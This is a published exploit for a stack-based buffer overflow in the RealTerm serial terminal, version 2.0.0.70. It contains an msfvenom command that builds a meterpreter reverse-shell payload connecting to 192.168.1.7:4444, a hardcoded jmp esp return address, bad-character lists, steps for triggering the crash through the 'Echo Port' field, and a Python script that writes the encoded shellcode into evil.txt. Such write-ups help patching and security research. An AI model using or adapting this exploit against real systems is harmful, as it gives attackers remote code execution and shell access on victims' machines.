# Exploit Title: RealTerm Serial Terminal 2.0.0.70 - 'Echo Port' Buffer Overflow (Stack-Based)
# Date: 2019-03-01
# Exploit Author: Uday Mittal
# Vendor Homepage: https://realterm.sourceforge.io/
# Software Link: https://sourceforge.net/projects/realterm/files/ 
# Version : 2.0.0.70
# Contact: https://twitter.com/yaksas443
# Tested on: Microsoft Windows XP SP3
# original PoC: https://www.exploit-db.com/exploits/46391

# EIP offset: 264
# 0x77fab277 : jmp esp |  {PAGE_EXECUTE_READ} [SHLWAPI.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5912 (C:\WINDOWS\system32\SHLWAPI.dll)
# badchars: \x00\x0A\x0D\x20\x2d\x3A\x40
# shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -b '\x00\x0A\x0D\x20\x2d\x3A\x40' -f python -v scode

# Proof of Concept:
# 1.- Run the python script "realtermPOC.py", it will create a new file "evil.txt"
# 2.- Copy the content of the new file 'evil.txt' to clipboard
# 3.- Open realterm.exe 
# 4.- Go to 'Echo Port' tab
# 5.- Paste clipboard in 'Port' field
# 6.- Click on button -> Change
# 7.- Check 'Echo On'  
# 8.- Application will crash and it will trigger the exploit


filename = "evil.txt"

scode =  ""
scode += "\xbb\xbb\xc1\xea\x41\xda\xc2\xd9\x74\x24\xf4\x5a\x33"
scode += "\xc9\xb1\x56\x83\xea\xfc\x31\x5a\x0f\x03\x5a\xb4\x23"
scode += "\x1f\xbd\x22\x21\xe0\x3e\xb2\x46\x68\xdb\x83\x46\x0e"
scode += "\xaf\xb3\x76\x44\xfd\x3f\xfc\x08\x16\xb4\x70\x85\x19"
scode += "\x7d\x3e\xf3\x14\x7e\x13\xc7\x37\xfc\x6e\x14\x98\x3d"
scode += "\xa1\x69\xd9\x7a\xdc\x80\x8b\xd3\xaa\x37\x3c\x50\xe6"
scode += "\x8b\xb7\x2a\xe6\x8b\x24\xfa\x09\xbd\xfa\x71\x50\x1d"
scode += "\xfc\x56\xe8\x14\xe6\xbb\xd5\xef\x9d\x0f\xa1\xf1\x77"
scode += "\x5e\x4a\x5d\xb6\x6f\xb9\x9f\xfe\x57\x22\xea\xf6\xa4"
scode += "\xdf\xed\xcc\xd7\x3b\x7b\xd7\x7f\xcf\xdb\x33\x7e\x1c"
scode += "\xbd\xb0\x8c\xe9\xc9\x9f\x90\xec\x1e\x94\xac\x65\xa1"
scode += "\x7b\x25\x3d\x86\x5f\x6e\xe5\xa7\xc6\xca\x48\xd7\x19"
scode += "\xb5\x35\x7d\x51\x5b\x21\x0c\x38\x33\x86\x3d\xc3\xc3"
scode += "\x80\x36\xb0\xf1\x0f\xed\x5e\xb9\xd8\x2b\x98\xc8\xcf"
scode += "\xcb\x76\x72\x9f\x35\x77\x82\x89\xf1\x23\xd2\xa1\xd0"
scode += "\x4b\xb9\x31\xdc\x99\x57\x38\x4a\xe2\x0f\x3d\x8d\x8a"
scode += "\x4d\x3e\x80\x16\xd8\xd8\xf2\xf6\x8a\x74\xb3\xa6\x6a"
scode += "\x25\x5b\xad\x65\x1a\x7b\xce\xac\x33\x16\x21\x18\x6b"
scode += "\x8f\xd8\x01\xe7\x2e\x24\x9c\x8d\x71\xae\x14\x71\x3f"
scode += "\x47\x5d\x61\x28\x30\x9d\x79\xa9\xd5\x9d\x13\xad\x7f"
scode += "\xca\x8b\xaf\xa6\x3c\x14\x4f\x8d\x3f\x53\xaf\x50\x09"
scode += "\x2f\x86\xc6\x35\x47\xe7\x06\xb5\x97\xb1\x4c\xb5\xff"
scode += "\x65\x35\xe6\x1a\x6a\xe0\x9b\xb6\xff\x0b\xcd\x6b\x57"
scode += "\x64\xf3\x52\x9f\x2b\x0c\xb1\xa3\x2c\xf2\x47\x8c\x94"
scode += "\x9a\xb7\x8c\x24\x5a\xd2\x0c\x75\x32\x29\x22\x7a\xf2"
scode += "\xd2\xe9\xd3\x9a\x59\x7c\x91\x3b\x5d\x55\x77\xe5\x5e"
scode += "\x5a\xac\x16\x24\x13\x53\xd7\xd9\x3d\x30\xd8\xd9\x41"
scode += "\x46\xe5\x0f\x78\x3c\x28\x8c\x3f\x4f\x1f\xb1\x16\xda"
scode += "\x5f\xe5\x69\xcf"



evilString = "A" * 264 + "\x77\xb2\xfa\x77" + "\x90"*200 + scode + "\x90" * (1732 - 468)
 

file = open(filename,'w')
file.write(evilString)
file.close()
